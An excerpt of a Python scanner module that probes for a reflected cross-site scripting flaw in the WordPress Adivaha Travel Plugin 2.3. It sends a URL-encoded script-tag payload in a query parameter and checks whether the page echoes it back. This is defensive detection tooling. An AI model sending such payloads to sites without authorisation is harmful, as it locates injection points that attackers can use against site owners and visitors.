...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Adivaha Travel Plugin 2.3 - Cross-Site Scripting Detection',
        ...
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'wordpress', 'wp', 'wp-plugin', 'xss', 'adivaha', 'travel', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/mobile-app/v3/?pid=77A89299&isMobile=%20clq95%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3Elb1ra', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('<script>alert(document.domain)</script>', 'travelpayout_flight',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="WordPress Adivaha Travel Plugin 2.3 - Cross-Site Scripting detected",
